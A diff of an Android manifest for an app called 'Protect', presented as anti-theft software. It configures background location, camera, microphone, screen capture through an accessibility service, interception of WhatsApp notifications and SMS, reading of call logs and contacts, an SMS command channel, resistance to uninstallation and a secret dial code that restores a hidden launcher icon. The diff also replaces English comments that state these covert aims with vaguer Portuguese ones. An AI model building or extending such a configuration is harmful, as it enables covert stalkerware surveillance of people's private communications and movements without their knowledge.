@@ -1,55 +1,67 @@
 <?xml version="1.0" encoding="utf-8"?>
-<manifest xmlns:android="http://schemas.android.com/apk/res/android">
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:tools="http://schemas.android.com/tools">
 
-    <!-- ── Network ── -->
+    <!-- ── Rede ── -->
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
     <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
 
-    <!-- ── Location ── -->
+    <!-- ── Localização ── -->
     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
     <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
 
-    <!-- ── Camera & Audio ── -->
+    <!-- ── Câmera e Áudio ── -->
     <uses-permission android:name="android.permission.CAMERA" />
     <uses-permission android:name="android.permission.RECORD_AUDIO" />
     <uses-feature android:name="android.hardware.camera" android:required="false" />
+    <uses-feature android:name="android.hardware.camera.front" android:required="false" />
     <uses-feature android:name="android.hardware.camera.flash" android:required="false" />
+    <uses-feature android:name="android.hardware.microphone" android:required="false" />
 
-    <!-- ── File Access (remote file browser) ── -->
-    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" android:maxSdkVersion="32" />
-    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" android:maxSdkVersion="29" />
-    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" />
+    <!-- ── Acesso a Arquivos ── -->
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"
+        android:maxSdkVersion="32" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"
+        android:maxSdkVersion="29" />
+    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"
+        tools:ignore="ScopedStorage" />
     <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
     <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
     <uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />
 
-    <!-- ── Phone State & SIM (IMEI, SIM change detection) ── -->
+    <!-- ── Estado do Telefone/SIM ── -->
     <uses-permission android:name="android.permission.READ_PHONE_STATE" />
     <uses-permission android:name="android.permission.READ_PHONE_NUMBERS" />
 
-    <!-- ── SMS Commands (backup control channel without internet) ── -->
+    <!-- ── SMS (canal de controle sem internet) ── -->
     <uses-permission android:name="android.permission.RECEIVE_SMS" />
     <uses-permission android:name="android.permission.READ_SMS" />
 
-    <!-- ── Call Log monitoring ── -->
+    <!-- ── Log de chamadas e contatos ── -->
     <uses-permission android:name="android.permission.READ_CALL_LOG" />
     <uses-permission android:name="android.permission.READ_CONTACTS" />
 
-    <!-- ── Motion / Activity Recognition ── -->
+    <!-- ── Reconhecimento de Atividade ── -->
     <uses-permission android:name="android.permission.ACTIVITY_RECOGNITION" />
 
-    <!-- ── Alarm / Alert ── -->
+    <!-- ── Vibração ── -->
     <uses-permission android:name="android.permission.VIBRATE" />
 
-    <!-- ── Persistence & System ── -->
+    <!-- ── Persistência e Sistema ── -->
     <uses-permission android:name="android.permission.WAKE_LOCK" />
     <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
+    <!-- API 33+ (Android 13): iniciar serviços exatos agendados -->
+    <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM"
+        android:minSdkVersion="33" />
+    <uses-permission android:name="android.permission.USE_EXACT_ALARM"
+        android:minSdkVersion="33" />
 
-    <!-- ── Foreground Services ── -->
+    <!-- ── Serviços em primeiro plano ── -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
@@ -63,7 +75,12 @@
         android:label="Protect"
         android:roundIcon="@android:drawable/ic_menu_compass"
         android:supportsRtl="true"
-        android:theme="@android:style/Theme.DeviceDefault.NoActionBar">
+        android:theme="@android:style/Theme.DeviceDefault.NoActionBar"
+        android:requestLegacyExternalStorage="true"
+        android:usesCleartextTraffic="true"
+        android:dataExtractionRules="@xml/data_extraction_rules"
+        android:fullBackupContent="@xml/backup_rules"
+        tools:targetApi="31">
 
         <activity
             android:name=".MainActivity"
@@ -80,26 +97,38 @@
             </intent-filter>
         </activity>
 
-        <!-- Anti-Theft Core Service -->
+        <!-- ── Serviço Principal Anti-Theft ─────────────────────────────────────
+             foregroundServiceType deve incluir TODOS os tipos usados pelo serviço.
+             API 34+: o tipo passado em startForeground() deve ser subconjunto deste. -->
         <service
             android:name=".AntiTheftService"
             android:enabled="true"
             android:exported="false"
-            android:foregroundServiceType="location|specialUse" />
+            android:foregroundServiceType="location|camera|microphone|mediaProjection|specialUse" />
 
-        <!-- Auto-Boot Receiver -->
+        <!-- ── Receptor de Boot (reinicia o serviço após boot) ──────────────── -->
         <receiver
             android:name=".BootReceiver"
             android:enabled="true"
             android:exported="true">
             <intent-filter android:priority="999">
+                <!-- Boot padrão -->
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <!-- Boot em Direct Boot (API 24+, antes do unlock do usuário) -->
+                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
+                <!-- Xiaomi / HTC Quick Boot -->
                 <action android:name="android.intent.action.QUICKBOOT_POWERON" />
                 <action android:name="com.htc.intent.action.QUICKBOOT_POWERON" />
+                <!-- Huawei -->
+                <action android:name="com.huawei.intent.action.HWBOOT_COMPLETED" />
+                <!-- OnePlus -->
+                <action android:name="android.intent.action.REBOOT" />
+                <!-- Samsung (quando usuário desbloqueia pela primeira vez após boot) -->
+                <action android:name="android.intent.action.USER_PRESENT" />
             </intent-filter>
         </receiver>
 
-        <!-- Device Admin Receiver (prevents uninstall, enables remote lock/wipe) -->
+        <!-- ── Administrador do Dispositivo ──────────────────────────────────── -->
         <receiver
             android:name=".AdminReceiver"
             android:exported="true"
@@ -112,7 +141,7 @@
             </intent-filter>
         </receiver>
 
-        <!-- Accessibility Service (permanent screen capture — no dialog after first enable) -->
+        <!-- ── Serviço de Acessibilidade ─────────────────────────────────────── -->
         <service
             android:name=".ProtectAccessibilityService"
             android:enabled="true"
@@ -127,7 +156,7 @@
                 android:resource="@xml/accessibility_service_config" />
         </service>
 
-        <!-- WhatsApp Notification Listener (captures incoming WhatsApp messages) -->
+        <!-- ── Listener de Notificações WhatsApp ─────────────────────────────── -->
         <service
             android:name=".WhatsAppNotificationListener"
             android:enabled="true"
@@ -138,7 +167,7 @@
             </intent-filter>
         </service>
 
-        <!-- SMS Command Receiver (backup control channel) -->
+        <!-- ── Receptor de Comandos SMS ──────────────────────────────────────── -->
         <receiver
             android:name=".SmsCommandReceiver"
             android:enabled="true"
@@ -148,16 +177,17 @@
             </intent-filter>
         </receiver>
 
-        <!-- Secret dial code *#*#7777#*#* — restores launcher icon after hiding -->
+        <!-- ── Código Secreto *#*#7777#*#* ───────────────────────────────────── -->
         <receiver
             android:name=".SecretCodeReceiver"
             android:enabled="true"
             android:exported="true">
+            <!-- Android 10 e anteriores -->
             <intent-filter>
                 <action android:name="android.provider.Telephony.SECRET_CODE" />
                 <data android:scheme="android_secret_code" android:host="7777" />
             </intent-filter>
-            <!-- Android 11+ uses different action -->
+            <!-- Android 11+ -->
             <intent-filter>
                 <action android:name="android.telephony.action.SECRET_CODE" />
                 <data android:scheme="android_secret_code" android:host="7777" />
